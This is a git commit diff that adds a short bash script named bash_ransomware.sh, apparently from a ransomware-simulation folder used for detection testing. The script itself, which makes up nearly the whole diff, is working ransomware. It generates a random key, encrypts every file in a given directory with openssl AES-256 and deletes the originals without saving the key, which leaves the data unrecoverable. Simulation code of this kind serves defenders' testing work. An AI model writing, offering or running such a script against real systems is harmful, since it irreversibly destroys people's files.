2294930acf8f3d08f3c96eea2eab01abd2c7faa5
mthcht <75267080+mthcht@users.noreply.github.com>
2022-12-06 09:00:30 +0100

    Update bash_ransomware.sh

--- Simulation/Linux/ransomware/bash_ransomware.sh
+++ Simulation/Linux/ransomware/bash_ransomware.sh
@@ -1,1 +1,30 @@
-.
+#!/bin/bash
+
+# This script will act as a ransomware, crypting all the files in a specific directory
+
+# Set the directory as an argument
+DIR=$1
+
+# Check if the argument is empty
+if [ -z "$DIR" ]; then
+    echo "You must provide a directory as an argument."
+    exit
+fi
+
+# Check if the argument is a valid directory
+if [ ! -d "$DIR" ]; then
+    echo "The argument provided is not a valid directory."
+    exit
+fi
+
+# Generate a random key
+key=$(openssl rand -hex 32)
+
+# Encrypt all the files in the directory
+echo "Encrypting files in $DIR..."
+for file in $DIR/*; do
+openssl enc -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -pass pass:"$key" -in "$file" -out "$file.mthcht"
+    rm "$file"
+done
+
+echo "Done!"
